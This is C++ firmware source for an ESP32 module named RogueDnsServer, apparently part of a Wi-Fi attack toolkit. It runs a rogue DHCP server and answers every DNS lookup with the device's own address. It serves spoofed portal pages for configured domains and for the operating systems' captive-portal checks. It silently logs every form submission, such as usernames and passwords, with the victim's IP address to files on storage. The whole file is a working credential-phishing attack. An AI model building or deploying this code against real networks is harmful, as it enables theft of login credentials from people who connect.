#include "RogueDnsServer.h"
#include "core/Device.h"
#include <esp_netif.h>
#include <WiFi.h>

// ── Public ──────────────────────────────────────────────────────────────────

bool RogueDnsServer::begin(IPAddress apIP)
{
  _apIP = apIP;
  _loadConfig(); // ok if no dns_config — captive portal can work without it

  // Stop built-in DHCP server to free port 67
  esp_netif_t* apNetif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
  if (apNetif) esp_netif_dhcps_stop(apNetif);

  if (!_dhcpUdp.begin(67)) {
    if (apNetif) esp_netif_dhcps_start(apNetif);
    return false;
  }

  if (!_dnsUdp.begin(53)) {
    _dhcpUdp.stop();
    if (apNetif) esp_netif_dhcps_start(apNetif);
    return false;
  }

  memset(_poolUsed, 0, sizeof(_poolUsed));
  memset(_clients, 0, sizeof(_clients));

  _startWeb();
  _running = true;
  return true;
}

void RogueDnsServer::end()
{
  if (!_running) return;
  _running = false;

  _stopWeb();
  _dhcpUdp.stop();
  _dnsUdp.stop();

  // Restart built-in DHCP server
  esp_netif_t* apNetif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
  if (apNetif) esp_netif_dhcps_start(apNetif);
}

void RogueDnsServer::update()
{
  if (!_running) return;
  _processDhcp();
  _processDns();
}

// ── Config ──────────────────────────────────────────────────────────────────

bool RogueDnsServer::_loadConfig()
{
  _recordCount = 0;
  if (!Uni.Storage || !Uni.Storage->exists(CONFIG_PATH)) return false;

  String content = Uni.Storage->readFile(CONFIG_PATH);
  if (content.isEmpty()) return false;

  int start = 0;
  while (start < (int)content.length() && _recordCount < MAX_RECORDS) {
    int end = content.indexOf('\n', start);
    if (end < 0) end = content.length();

    String line = content.substring(start, end);
    line.trim();
    start = end + 1;

    if (line.isEmpty() || line.startsWith("#")) continue;

    int sep = line.indexOf(':');
    if (sep <= 0) continue;

    String domain = line.substring(0, sep);
    String path   = line.substring(sep + 1);
    domain.trim();
    path.trim();

    if (domain.isEmpty() || path.isEmpty()) continue;

    strncpy(_records[_recordCount].domain, domain.c_str(), sizeof(_records[0].domain) - 1);
    strncpy(_records[_recordCount].path,   path.c_str(),   sizeof(_records[0].path) - 1);
    _recordCount++;
  }

  return _recordCount > 0;
}

// ── DHCP Server ─────────────────────────────────────────────────────────────

void RogueDnsServer::_processDhcp()
{
  int len = _dhcpUdp.parsePacket();
  if (len <= 0 || len > 512) return;

  uint8_t buf[512];
  _dhcpUdp.read(buf, len);
  _handleDhcpPacket(buf, len);
}

void RogueDnsServer::_handleDhcpPacket(uint8_t* buf, int len)
{
  uint8_t msgType = _getDhcpMsgType(buf, len);
  uint8_t ipSuffix = 0;

  if (msgType == 1) { // DISCOVER → OFFER
    uint8_t mac[6];
    memcpy(mac, &buf[28], 6);
    ipSuffix = _allocateIp(mac);
    if (ipSuffix == 0) return;
    _buildDhcpResponse(buf, len, 2, ipSuffix);
  } else if (msgType == 3) { // REQUEST → ACK
    uint8_t mac[6];
    memcpy(mac, &buf[28], 6);
    ipSuffix = _allocateIp(mac);
    if (ipSuffix == 0) return;
    _buildDhcpResponse(buf, len, 5, ipSuffix);
  } else {
    return;
  }

  _dhcpUdp.beginPacket(IPAddress(255, 255, 255, 255), 68);
  _dhcpUdp.write(buf, len);
  _dhcpUdp.endPacket();
}

uint8_t RogueDnsServer::_getDhcpMsgType(uint8_t* buf, int len)
{
  int i = 240; // options start after magic cookie
  while (i < len) {
    uint8_t opt = buf[i++];
    if (opt == 255) break;
    if (opt == 0) continue;
    if (i >= len) break;
    uint8_t optLen = buf[i++];
    if (i + optLen > len) break;
    if (opt == 53 && optLen == 1) return buf[i];
    i += optLen;
  }
  return 0;
}

void RogueDnsServer::_buildDhcpResponse(uint8_t* buf, int& len, uint8_t msgType, uint8_t ipSuffix)
{
  buf[0] = 2; // BOOTREPLY

  // yiaddr = client's assigned IP
  buf[16] = _apIP[0];
  buf[17] = _apIP[1];
  buf[18] = _apIP[2];
  buf[19] = ipSuffix;

  // siaddr = server IP
  buf[20] = _apIP[0];
  buf[21] = _apIP[1];
  buf[22] = _apIP[2];
  buf[23] = _apIP[3];

  // broadcast flag
  buf[10] = 0x80;
  buf[11] = 0x00;

  // clear sname + file
  memset(&buf[34], 0, 10);

  // magic cookie
  buf[236] = 0x63;
  buf[237] = 0x82;
  buf[238] = 0x53;
  buf[239] = 0x63;

  int i = 240;

  // Option 53: Message Type
  buf[i++] = 53; buf[i++] = 1; buf[i++] = msgType;

  // Option 54: Server Identifier
  buf[i++] = 54; buf[i++] = 4;
  buf[i++] = _apIP[0]; buf[i++] = _apIP[1];
  buf[i++] = _apIP[2]; buf[i++] = _apIP[3];

  // Option 1: Subnet Mask
  buf[i++] = 1; buf[i++] = 4;
  buf[i++] = 255; buf[i++] = 255; buf[i++] = 255; buf[i++] = 0;

  // Option 3: Router (gateway = ESP32)
  buf[i++] = 3; buf[i++] = 4;
  buf[i++] = _apIP[0]; buf[i++] = _apIP[1];
  buf[i++] = _apIP[2]; buf[i++] = _apIP[3];

  // Option 6: DNS Server (= ESP32)
  buf[i++] = 6; buf[i++] = 4;
  buf[i++] = _apIP[0]; buf[i++] = _apIP[1];
  buf[i++] = _apIP[2]; buf[i++] = _apIP[3];

  // Option 51: Lease Time (1 day)
  buf[i++] = 51; buf[i++] = 4;
  buf[i++] = 0x00; buf[i++] = 0x01; buf[i++] = 0x51; buf[i++] = 0x80;

  // Option 255: End
  buf[i++] = 255;

  // Pad to 4-byte alignment
  while (i % 4 != 0) buf[i++] = 0;

  len = i;
}

uint8_t RogueDnsServer::_allocateIp(uint8_t* mac)
{
  // Check if MAC already has an IP
  for (int i = 0; i < DHCP_POOL_SIZE; i++) {
    if (_clients[i].suffix != 0 && memcmp(_clients[i].mac, mac, 6) == 0) {
      return _clients[i].suffix;
    }
  }

  // Allocate new
  for (int i = 0; i < DHCP_POOL_SIZE; i++) {
    if (!_poolUsed[i]) {
      _poolUsed[i] = true;
      memcpy(_clients[i].mac, mac, 6);
      _clients[i].suffix = _poolStart + i;
      return _clients[i].suffix;
    }
  }
  return 0; // pool exhausted
}

// ── DNS Server ──────────────────────────────────────────────────────────────

void RogueDnsServer::_processDns()
{
  int len = _dnsUdp.parsePacket();
  if (len <= 0 || len > 512) return;

  uint8_t buf[512];
  _dnsUdp.read(buf, len);

  // Must be a standard query (QR=0, OPCODE=0)
  if (len < 12) return;
  if (buf[2] & 0x80) return;

  // Extract domain name from question section
  char domain[256] = {};
  int pos = 12; // skip header
  int dpos = 0;
  while (pos < len && buf[pos] != 0) {
    uint8_t labelLen = buf[pos++];
    if (pos + labelLen > len) return;
    if (dpos > 0) domain[dpos++] = '.';
    memcpy(&domain[dpos], &buf[pos], labelLen);
    dpos += labelLen;
    pos += labelLen;
  }
  domain[dpos] = 0;
  pos++; // skip null terminator

  // Read QTYPE
  uint16_t qtype = (buf[pos] << 8) | buf[pos + 1];
  pos += 4; // skip QTYPE + QCLASS

  // Only respond to A record queries (type 1)
  if (qtype != 1) return;

  // Resolve ALL domains to ESP32 IP
  buf[2] = 0x84; // QR=1, AA=1
  buf[3] = 0x00; // RCODE=0
  buf[6] = 0x00; buf[7] = 0x01; // ANCOUNT=1

  // Answer section: pointer to name in question
  buf[pos++] = 0xC0; buf[pos++] = 0x0C; // name pointer
  buf[pos++] = 0x00; buf[pos++] = 0x01; // TYPE A
  buf[pos++] = 0x00; buf[pos++] = 0x01; // CLASS IN
  buf[pos++] = 0x00; buf[pos++] = 0x00;
  buf[pos++] = 0x00; buf[pos++] = 0x3C; // TTL 60s
  buf[pos++] = 0x00; buf[pos++] = 0x04; // RDLENGTH
  buf[pos++] = _apIP[0];
  buf[pos++] = _apIP[1];
  buf[pos++] = _apIP[2];
  buf[pos++] = _apIP[3];

  _dnsUdp.beginPacket(_dnsUdp.remoteIP(), _dnsUdp.remotePort());
  _dnsUdp.write(buf, pos);
  _dnsUdp.endPacket();
}

bool RogueDnsServer::_matchDomain(const char* query, const char* config)
{
  // Case-insensitive match, also match subdomains
  // e.g. config="google.com" matches "google.com" and "www.google.com"
  int qlen = strlen(query);
  int clen = strlen(config);
  if (qlen == clen) return strcasecmp(query, config) == 0;
  if (qlen > clen && query[qlen - clen - 1] == '.') {
    return strcasecmp(&query[qlen - clen], config) == 0;
  }
  return false;
}

const char* RogueDnsServer::_findPath(const char* domain)
{
  for (int i = 0; i < _recordCount; i++) {
    if (_matchDomain(domain, _records[i].domain)) {
      return _records[i].path;
    }
  }
  return nullptr;
}

// ── Web Server (Port 80) ───────────────────────────────────────────────────

void RogueDnsServer::_startWeb()
{
  _webServer = new AsyncWebServer(80);

  _webServer->onNotFound([this](AsyncWebServerRequest* req) {
    if (!Uni.Storage) {
      req->send(404, "text/plain", "Not Found");
      return;
    }

    String host = req->host();
    int colon = host.indexOf(':');
    if (colon > 0) host = host.substring(0, colon);

    // Handle POST — save submitted data
    if (req->method() == HTTP_POST) {
      String data;
      for (int i = 0; i < (int)req->params(); i++) {
        const AsyncWebParameter* p = req->getParam(i);
        if (p->isPost()) {
          if (data.length() > 0) data += "&";
          data += p->name() + "=" + p->value();
        }
      }

      if (data.length() > 0 && Uni.Storage) {
        String cleanHost = host;
        cleanHost.replace(".", "_");
        String savePath = "/unigeek/wifi/captives/" + cleanHost + ".txt";
        Uni.Storage->makeDir("/unigeek/wifi/captives");

        String entry = req->client()->remoteIP().toString() + " | " + data + "\n";
        fs::File f = Uni.Storage->open(savePath.c_str(), FILE_APPEND);
        if (f) {
          f.print(entry);
          f.close();
        }

        if (_postCb) {
          _postCb(req->client()->remoteIP().toString().c_str(),
                  host.c_str(), data.c_str());
        }
      }

      req->redirect("/");
      return;
    }

    // Log GET visit
    if (_visitCb) {
      _visitCb(req->client()->remoteIP().toString().c_str(), host.c_str());
    }

    // unigeek.local → redirect to Web File Manager on port 8080
    if (_fileManagerEnabled && host.equalsIgnoreCase("unigeek.local")) {
      String url = "http://" + WiFi.softAPIP().toString() + ":8080" + req->url();
      req->redirect(url);
      return;
    }

    // Connectivity checks → captive page or 204
    bool isCheck = host.indexOf("captive.apple") >= 0 ||
                   host.equalsIgnoreCase("connectivitycheck.gstatic.com") ||
                   host.equalsIgnoreCase("clients3.google.com") ||
                   host.equalsIgnoreCase("www.msftconnecttest.com") ||
                   host.equalsIgnoreCase("nmcheck.gnome.org") ||
                   host.equalsIgnoreCase("detectportal.firefox.com");
    if (isCheck) {
      if (_captivePath[0] != '\0') { _serveFromPath(_captivePath, req); }
      else { req->send(204); }
      return;
    }

    // Configured domain or fallback to portals/default
    const char* p = _findPath(host.c_str());
    _serveFromPath(p ? p : "/unigeek/wifi/portals/default", req);
  });

  _webServer->begin();
}

void RogueDnsServer::_serveFromPath(const char* portalPath, AsyncWebServerRequest* req)
{
  String uri = req->url();
  if (uri.endsWith("/")) uri += "index.htm";

  String filePath = String(portalPath) + uri;
  // Map .html requests to .htm files
  if (filePath.endsWith(".html")) {
    filePath = filePath.substring(0, filePath.length() - 5) + ".htm";
  }
  if (Uni.Storage->exists(filePath.c_str())) {
    req->send(Uni.Storage->getFS(), filePath, String(), false);
  } else {
    // Any non-existent path -> serve index.htm
    String indexPath = String(portalPath) + "/index.htm";
    if (Uni.Storage->exists(indexPath.c_str())) {
      req->send(Uni.Storage->getFS(), indexPath, String(), false);
    } else {
      req->send(404, "text/plain", "Not Found");
    }
  }
}

void RogueDnsServer::_stopWeb()
{
  if (_webServer) {
    _webServer->end();
    delete _webServer;
    _webServer = nullptr;
  }
}
